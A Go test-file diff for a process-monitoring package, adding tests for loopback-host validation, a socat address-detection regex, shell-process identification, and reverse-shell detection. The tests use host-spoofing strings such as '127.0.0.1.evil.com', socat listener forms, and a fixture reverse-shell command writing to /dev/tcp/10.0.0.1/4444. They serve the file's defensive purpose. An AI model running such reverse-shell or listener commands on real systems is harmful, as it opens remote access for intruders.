@@ -1,6 +1,10 @@
 package monitor
 
-import "testing"
+import (
+	"os"
+	"strings"
+	"testing"
+)
 
 func TestCheckEnvAccess(t *testing.T) {
 	tests := []struct {
@@ -258,5 +262,93 @@ func TestDetectProcessCountSpike(t *testing.T) {
 				t.Errorf("Threshold: got %d want %d", got.Threshold, tt.threshold)
 			}
 		})
+	}
+}
+
+// isLoopbackHost accepts only exact loopback/unspecified addresses: names
+// that merely look numeric (127.0.0.256, 127.) are resolved as hostnames and
+// can point anywhere.
+func TestIsLoopbackHost(t *testing.T) {
+	for host, want := range map[string]bool{
+		"localhost": true, "localhost.": true, "127.0.0.1": true, "127.1": true,
+		"127.0.1": true, "0": true, "0.0": true, "0.0.0.0": true, "0x7f.1": true,
+		"0177.0.0.1": true, "::1": true, "[::1]": true,
+		"127.0.0.256": false, "127.": false, "127..1": false, "128.0.0.1": false,
+		"127.0.0.1.evil.com": false, "localhost.evil.com": false, "08": false,
+		"0b1111111.1": false, "1_27.0.0.1": false, "0o177.1": false, "": false,
+		"10.0.0.1": false,
+	} {
+		if got := isLoopbackHost(host); got != want {
+			t.Errorf("isLoopbackHost(%q) = %v, want %v", host, got, want)
+		}
+	}
+}
+
+// socatNetAddrRe recognizes socat address forms (including -L/-RECVFROM
+// aliases and service-name ports) but not look-alike words or URLs.
+func TestSocatNetAddrRe(t *testing.T) {
+	for in, want := range map[string]bool{
+		"x tcp:example.com:443":    true,
+		"x tcp4-connect:h:http":    true,
+		"x tcp-l:4444":             true,
+		"x tcp-listen:4444,fork":   true,
+		"x udp-recvfrom:53":        true,
+		"x openssl-listen:4443":    true,
+		"x ssl-l:4443":             true,
+		"x tcp6:[2001:db8::1]:443": true,
+		"tcpsocket: port: 8080":    false,
+		`rg "tcp:|exec:" src/`:     false,
+		"value: tcp://docker:2375": false,
+		"see tcp: notes":           false,
+	} {
+		if got := socatNetAddrRe.MatchString(in); got != want {
+			t.Errorf("socatNetAddrRe(%q) = %v, want %v", in, got, want)
+		}
+	}
+}
+
+// isShellProcess must not rely on argv[0] alone: the process sets argv[0]
+// itself, while Name (/proc/<pid>/status, from the executable) comes from the
+// kernel. Login shells ("-bash") and leading whitespace are normalized.
+func TestIsShellProcess(t *testing.T) {
+	for _, tc := range []struct {
+		proc Process
+		want bool
+	}{
+		{Process{Command: "bash -c true", Name: "bash"}, true},
+		{Process{Command: "/usr/bin/bash -c true"}, true},
+		{Process{Command: "-bash"}, true},
+		{Process{Command: "   sh -c true"}, true},
+		{Process{Command: "something-else -c true", Name: "bash"}, true},
+		{Process{Command: "git commit -m x", Name: "git"}, false},
+		{Process{Command: "grep -rn x docs", Name: "grep"}, false},
+		{Process{Command: "python3 -c x", Name: "python3"}, false},
+	} {
+		if got := isShellProcess(tc.proc, strings.ToLower(tc.proc.Command)); got != tc.want {
+			t.Errorf("isShellProcess(%+v) = %v, want %v", tc.proc, got, tc.want)
+		}
+	}
+}
+
+// A shell whose argv[0] doesn't name a shell is still recognized as one from
+// its kernel process name (review of #859).
+func TestDetectReverseShells_ShellRecognizedByKernelName(t *testing.T) {
+	cmd := `worker exec 3<>/dev/tcp/10.0.0.1/4444`
+	if n := len(DetectReverseShells([]Process{{PID: 1, User: "1000", Command: cmd, Name: "bash"}})); n != 1 {
+		t.Errorf("shell identified by its kernel name should be checked, got %d threats", n)
+	}
+	if n := len(DetectReverseShells([]Process{{PID: 1, User: "1000", Command: cmd, Name: "worker"}})); n != 0 {
+		t.Errorf("a non-shell process should not be checked for /dev/tcp, got %d threats", n)
+	}
+}
+
+// The host-side collector records the kernel process name.
+func TestReadProcessFromProc_RecordsName(t *testing.T) {
+	p, err := readProcessFromProc(os.Getpid())
+	if err != nil {
+		t.Skipf("no /proc: %v", err)
+	}
+	if p.Name == "" {
+		t.Error("Name should be filled from /proc/<pid>/status")
 	}
 }
